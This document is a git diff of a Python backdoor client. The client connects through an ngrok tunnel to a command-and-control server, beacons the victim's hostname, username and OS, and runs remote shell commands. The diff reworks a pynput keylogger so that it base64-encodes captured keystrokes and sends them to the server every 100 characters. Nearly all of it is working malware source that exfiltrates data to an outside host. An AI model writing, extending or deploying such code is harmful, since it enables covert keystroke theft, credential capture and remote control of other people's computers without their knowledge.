@@ -17,26 +17,17 @@ from pynput import keyboard
 # If the free version of ngrok is used, the port will change each time ngrok is activated
 address = "0.tcp.jp.ngrok.io" # address
 port = 18642 # port 
-keyStorage = {} # Dictionary to store keystrokes for keylogging for every user
+glbSock = None # Stores the sock 
 
-# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
-# Handles AttributeError by writing "Special key: "
-def on_press(key, sock):
-    try:
-      keyStorage[sock] += str(key())
-    except AttributeError:
-      with open(os.path.join(userCWD, "keylog.txt"), "a") as log_file:
-        log_file.write(f"Special key: {str(key)}")
-        log_file.close()
+keyBuffer = "" # String to store keystrokes for keylogging
+loggerIsRunning = False # Stores whether the keylogger is working
 
-def start_keylogger(sock):
-  keyStorage[sock] = ""
-  with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+
 # Handles the connection of the client to the C2 server through the socket library and tcp server. 
 # Preconditions: Valid address and socket, ngrok tcp port is open
 # Postconditions: Machine is connected to the C2 server, handler thread is wokring, the machine sends its information via send_beacon
 def connect_client():
+  global glbSock
   # Infinite loop to keep trying to connect to the server
   while True:
     try:
@@ -46,8 +37,8 @@ def connect_client():
         clientSocket.connect((address, port))
         send_beacon(clientSocket) # Send beacon to server to indicate that client is alive
         clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))
-
-        handler = threading.Thread(target = command_handler, args=(clientSocket,), daemon = True)
+        glbSock = clientSocket
+        handler = threading.Thread(target = command_handler, args=(glbSock,), daemon = True)
         handler.start()
         handler.join()
     except Exception as e:
@@ -62,8 +53,49 @@ def send_beacon(sock):
   beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
   sock.send(beacon.encode("utf-8"))
 
+###
+### Keylogger functions
+###
 
+# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
+# Handles AttributeError by writing "SP: "
+# This function is called to store the keystrokes in a string, then sends it back to the user every 100
+# characters. After sending, the keyBuffer is cleared for the next 100 characters.
+def on_press(key):
+    global keyBuffer, glbSock, loggerIsRunning
+    
+    # Stops the logger and resets for next time
+    if not loggerIsRunning:
+      keyBuffer = ""
+      return
+    
+    try:
+      keyBuffer += key.char
+    except AttributeError:
+      keyBuffer += f" [SP: {key}] "
 
+    if len(keyBuffer) >= 100 and glbSock is not None: # Send keystrokes every 100 characters
+      try:
+        encoded = base64.b64encode(keyBuffer.encode("utf-8")).decode("utf-8")
+        glbSock.send(f"KEYLOG|{encoded}".encode("utf-8"))
+        # Clear keyBuffer after sending
+        keyBuffer = ""
+      except:
+        keyBuffer = ""
+
+# Activates the keylogger while storing the sock as global sock. 
+def start_keylogger(sock):
+  #updates sock again before using on_press && loggerIsRunning is set to True
+  global glbSock, loggerIsRunning
+  glbSock= sock
+  loggerIsRunning = True
+
+  #Starts on_press
+  with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+###
+### Shell command function
+###
 
 # Executes the command based off of the command that is decoded and sends it back through the specified socket by looking through whether
 # the command is a cd command, which goes through a different process due to possible child process change. Other terminal commands will 
@@ -73,16 +105,7 @@ def send_beacon(sock):
 # Postconditions: The command is executed and the output is sent back to the user 
 def execute_command(command, sock):
     try:
-      #Keylogging command
-      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
-      keyStrokes = ""
-      if command.startswith("KEYLOG_START"):
-        result = "CMD_RES|Keylogging started"
-        start_keylogger()
-      if command.startswith("KEYLOG_STOP"):
-        
-        result = "CMD_RES|Keylogging stopped"
-
+    
       # Special handling for "cd" command
       if command.startswith("cd "):
         try:
@@ -113,18 +136,46 @@ def execute_command(command, sock):
     except Exception as e:
       sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))
 
+
+###
+### Command Handler
+###
+
 # Handles the command that is received by the user/listener. Using data to collect the input of the user, this function handles the 
 # tranasition between the user and the function execute)command) through reformatting of the input. If there is an error, it
 # prints it.
 # Preconditions: Valid specified socket, libraries correctly imported
 # Postconditions: execute_command is functioning or the print statement is printed
 def command_handler(sock):
+  global loggerIsRunning
   while True:
     try:
       data = sock.recv(4096)
+
+      # When no inut
       if not data: break
+      
       cmd = data.decode("utf-8", errors="ignore").strip()
-      execute_command(cmd, sock)
+      
+      
+      # Keylogging command
+      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
+      if cmd.startswith("KEYLOG_START"):
+        keylog_thread = threading.Thread(target=start_keylogger, args = (sock,),daemon=True)
+        keylog_thread.start()
+        sock.send("KEYLOG| STARTED")
+      elif cmd == "KEYLOG_STOP":
+        loggerIsRunning = False
+        sock.send("KEYLOG| STOPPED")
+
+      #Other functions to be implemented
+      
+
+      # Shell Command
+      else:
+        execute_command(cmd, sock)
+
+      # Error Handling
     except Exception as e:
       print(f'[*] Error receiving data: {e}')
       break
